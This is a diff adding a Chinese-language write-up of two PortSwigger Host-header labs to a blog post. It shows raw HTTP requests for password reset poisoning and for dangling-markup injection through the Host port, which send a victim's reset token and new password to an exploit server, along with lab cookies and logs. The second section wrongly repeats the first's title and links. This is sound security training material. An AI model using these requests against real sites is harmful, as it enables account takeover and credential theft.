@@ -440,6 +440,164 @@ GET @private-intranet/example HTTP/1.1
 
 就會變成 `http://internal-backend@private-intranet/example`，其中 `internal-backend` 就變成 username，我們就可以控制 `private-intranet/example` 來訪問內網資源
 
+## Lab: Basic password reset poisoning
+
+| Dimension | Description                                                                                                                             |
+| --------- | --------------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning#how-to-construct-a-password-reset-poisoning-attack |
+| Lab       | https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning     |
+
+構造
+
+```
+POST /forgot-password HTTP/2
+Host: exploit-0a81001603f64693810c84aa01ff0044.exploit-server.net
+Cookie: session=kI0LhMB5RmuEWxjZMoIEcfP3b6UcO1Q7; _lab=46%7cMCwCFAKLBfATyYEJeLlSJ6aiBNzN5EwcAhR3uSOTdos0EPmk3yUgRmEUGMZ2X5xxBTkfbkKguH6Cy5%2fR30ivq4SM%2bLRGMJ7ZD8bc6tzat9FC%2bJVqLSway%2bV30C0Gcf9HeV1hP6y%2fSzwcPzYHsHvqVhQWBaZmMnxVtW7Cv4kXjZqsgO4%3d
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+
+username=carlos&csrf=HQHgq9K9G7JvzBKQFOG9NVrJqaxqxOzj
+```
+
+之後受害者會點擊 Email 的重設密碼連結，我們就可以在 exploit-server 的 log 看到
+
+```
+10.0.3.70       2025-10-09 10:57:55 +0000 "GET /forgot-password?temp-forgot-password-token=eltc9c54h6jvgqzj7u9pld3fzzgla5o4 HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+```
+
+之後訪問 https://0aaf00ed0338460881cf850a00b60072.web-security-academy.net/forgot-password?temp-forgot-password-token=eltc9c54h6jvgqzj7u9pld3fzzgla5o4 ，就可以成功更換密碼～
+
+## Lab: Basic password reset poisoning
+
+| Dimension | Description                                                                                                                             |
+| --------- | --------------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning#how-to-construct-a-password-reset-poisoning-attack |
+| Lab       | https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning     |
+
+先嘗試跑一次忘記密碼的流程，看到
+
+```html
+<div
+  style="word-break: break-all"
+  class="dirty-body"
+  data-dirty="&lt;p&gt;Hello!&lt;/p&gt;&lt;p&gt;Please &lt;a href='https://0abd001903edf4e78198d5a900a30008.web-security-academy.net/login'&gt;click here&lt;/a&gt; to login with your new password: fdl19nanDC&lt;/p&gt;&lt;p&gt;Thanks,&lt;br/&gt;Support team&lt;/p&gt;&lt;i&gt;This email has been scanned by the MacCarthy Email Security service&lt;/i&gt;"
+>
+  <p>Hello!</p>
+  <p>
+    Please
+    <a
+      href="https://0abd001903edf4e78198d5a900a30008.web-security-academy.net/login"
+      >click here</a
+    >
+    to login with your new password: fdl19nanDC
+  </p>
+  <p>Thanks,<br />Support team</p>
+  <i>This email has been scanned by the MacCarthy Email Security service</i>
+</div>
+```
+
+嘗試重放忘記密碼的 HTTP Request，Host 注入雙引號
+
+```
+POST /forgot-password HTTP/2
+Host: 0abd001903edf4e78198d5a900a30008.web-security-academy.net"
+Cookie: _lab=45%7cMCsCFDVbI%2fJ78bImWKHhr%2b22Iz1mqhByAhNRucP%2ftREiChpaWXvBiKL2TtzHHSDBwJM3OdgSAGeFJtzwoBOkwPn9ITP95bYRCB%2bg%2b%2fJNdRjUAkjY4heZEJPP1j5E4KSwIKnPCScglNvjSl5iXXXmmCrZ7h%2fAj2oNuOkoxqiDVOSwtg%3d%3d; session=lAD5I7qARQpdqwVALm8KaUJk6sW9wSOZ
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+
+csrf=48aCyVz3zS9YWYYn6xIFQGbXu5XXidWg&username=wiener
+```
+
+結果
+
+```
+HTTP/2 504 Gateway Timeout
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 207
+
+<html><head><title>Server Error: Gateway Timeout</title></head><body><h1>Server Error: Gateway Timeout (3) connecting to 0abd001903edf4e78198d5a900a30008.web-security-academy.net&amp;quot;</h1></body></html>
+```
+
+嘗試用 [Port](#port)
+
+```
+POST /forgot-password HTTP/2
+Host: 0abd001903edf4e78198d5a900a30008.web-security-academy.net:"
+Cookie: _lab=45%7cMCsCFDVbI%2fJ78bImWKHhr%2b22Iz1mqhByAhNRucP%2ftREiChpaWXvBiKL2TtzHHSDBwJM3OdgSAGeFJtzwoBOkwPn9ITP95bYRCB%2bg%2b%2fJNdRjUAkjY4heZEJPP1j5E4KSwIKnPCScglNvjSl5iXXXmmCrZ7h%2fAj2oNuOkoxqiDVOSwtg%3d%3d; session=lAD5I7qARQpdqwVALm8KaUJk6sW9wSOZ
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+
+csrf=48aCyVz3zS9YWYYn6xIFQGbXu5XXidWg&username=wiener
+```
+
+雙引號被 encode 之後塞進去了 `https://0abd001903edf4e78198d5a900a30008.web-security-academy.net:&quot;/login`
+
+嘗試單引號
+
+```
+POST /forgot-password HTTP/2
+Host: 0abd001903edf4e78198d5a900a30008.web-security-academy.net:'
+Cookie: _lab=45%7cMCsCFDVbI%2fJ78bImWKHhr%2b22Iz1mqhByAhNRucP%2ftREiChpaWXvBiKL2TtzHHSDBwJM3OdgSAGeFJtzwoBOkwPn9ITP95bYRCB%2bg%2b%2fJNdRjUAkjY4heZEJPP1j5E4KSwIKnPCScglNvjSl5iXXXmmCrZ7h%2fAj2oNuOkoxqiDVOSwtg%3d%3d; session=lAD5I7qARQpdqwVALm8KaUJk6sW9wSOZ
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+
+csrf=48aCyVz3zS9YWYYn6xIFQGbXu5XXidWg&username=wiener
+```
+
+成功改變 HTML 結構
+
+```html
+<a href='https://0abd001903edf4e78198d5a900a30008.web-security-academy.net:'/login'>
+```
+
+嘗試
+
+```
+Host: 0abd001903edf4e78198d5a900a30008.web-security-academy.net:' data-hello='
+```
+
+得到
+
+```html
+<a
+  href="https://0abd001903edf4e78198d5a900a30008.web-security-academy.net:"
+  data-hello="/login"
+  >click here</a
+>
+```
+
+嘗試
+
+```
+Host: 0abd001903edf4e78198d5a900a30008.web-security-academy.net:' ></a></p><a href="https://exploit-0a24003303edf426814dd45101c400eb.exploit-server.net
+```
+
+得到
+
+```html
+<div
+  style="word-break: break-all"
+  class="dirty-body"
+  data-dirty="<p>Hello!</p><p>Please <a href='https://0abd001903edf4e78198d5a900a30008.web-security-academy.net:' ></a></p><a href="https://exploit-0a24003303edf426814dd45101c400eb.exploit-server.net/login'>click here</a> to login with your new password: 6wQvim21lL</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>"
+>
+  <p>Hello!</p>
+  <p>Please <a href="https://0abd001903edf4e78198d5a900a30008.web-security-academy.net:"></a></p>
+</div>
+```
+
+看一下 exploit-server 的 log
+
+```
+10.0.3.244      2025-10-09 23:52:05 +0000 "GET /login'>click+here</a>+to+login+with+your+new+password:+6wQvim21lL</p><p>Thanks,<br/>Support+team</p><i>This+email+has+been+scanned+by+the+MacCarthy+Email+Security+service</i> HTTP/1.1" 404
+```
+
+成功提取到 Password，之後就把帳號換成受害者 `carlos`，成功通關～
+
+## 小結
+
+有先寫過 HTTP 30 篇文章，再來打這個 Lab，我感覺會輕鬆很多，但我還是從中有意識到自己沒補足的知識，例如 HTTP Request Target 是 absolute URL 還是 relative URL 的差別，之後可以再開一篇文章來補～
+
 ## 參考資料
 
 - https://portswigger.net/web-security/host-header
